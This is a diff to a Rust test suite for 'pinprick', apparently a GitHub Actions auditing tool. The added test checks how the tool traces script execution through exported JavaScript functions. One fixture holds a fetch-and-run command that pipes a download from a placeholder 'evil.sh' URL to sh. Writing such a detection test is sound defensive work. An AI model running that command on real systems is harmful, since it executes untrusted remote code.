@@ -341,7 +341,7 @@ jobs:
         .unwrap();
     assert_eq!(output.status.code(), Some(2));
     let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert_eq!(report["rules_version"], 5);
+    assert_eq!(report["rules_version"], 6);
     assert_eq!(report["audited_bundled"], 0);
     assert_eq!(report["external_actions_skipped"], 2);
     assert_eq!(report["coverage_complete"], false);
@@ -2159,6 +2159,78 @@ module.exports = extract7z;
     let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
     assert_eq!(output.status.code(), Some(0), "{report}");
     assert_eq!(report["coverage_complete"], true, "{report}");
+}
+
+#[test]
+fn exported_function_parameters_are_not_bound_to_local_calls() {
+    let prelude = "import cp from 'child_process';\nimport path from 'path';\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
+    let local_call = "run(path.join(import.meta.dirname, 'x.sh'));\n";
+    let importer = "import { run } from './lib.js';\nimport path from 'path';\nrun(path.join(import.meta.dirname, 'evil.sh'));\n";
+    let failures: Vec<String> = [
+        (
+            "function declaration",
+            "export function run(script) { return cp.spawnSync(which('bash'), [script]); }\n",
+            importer,
+            (Some(2), false),
+        ),
+        (
+            "function expression",
+            "export const run = function (script) { return cp.spawnSync(which('bash'), [script]); };\n",
+            importer,
+            (Some(2), false),
+        ),
+        (
+            "arrow function",
+            "export const run = (script) => cp.spawnSync(which('bash'), [script]);\n",
+            importer,
+            (Some(2), false),
+        ),
+        (
+            "default export",
+            "export default function run(script) { return cp.spawnSync(which('bash'), [script]); }\n",
+            "import run from './lib.js';\nimport path from 'path';\nrun(path.join(import.meta.dirname, 'evil.sh'));\n",
+            (Some(2), false),
+        ),
+        (
+            "export specifier",
+            "function run(script) { return cp.spawnSync(which('bash'), [script]); }\nexport { run };\n",
+            importer,
+            (Some(2), false),
+        ),
+        (
+            "unexported function",
+            "function run(script) { return cp.spawnSync(which('bash'), [script]); }\n",
+            "import './lib.js';\n",
+            (Some(1), true),
+        ),
+    ]
+    .iter()
+    .filter_map(|(name, definition, main, expected)| {
+        let lib = format!("{prelude}{definition}{local_call}");
+        let dir = common::repo_with_local_action(
+            &node_action("index.js"),
+            &[
+                ("package.json", "{ \"type\": \"module\" }\n"),
+                ("index.js", main),
+                ("lib.js", &lib),
+                ("x.sh", CURL_BASH),
+                ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
+            ],
+        );
+        let output = common::pinprick_cmd()
+            .args(["audit", "--no-audited-catalog", "--json"])
+            .arg(dir.path())
+            .output()
+            .unwrap();
+        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+        let result = (
+            output.status.code(),
+            report["coverage_complete"].as_bool().unwrap(),
+        );
+        (result != *expected).then(|| format!("{name}: {result:?} {report}"))
+    })
+    .collect();
+    assert!(failures.is_empty(), "{failures:#?}");
 }
 
 #[test]
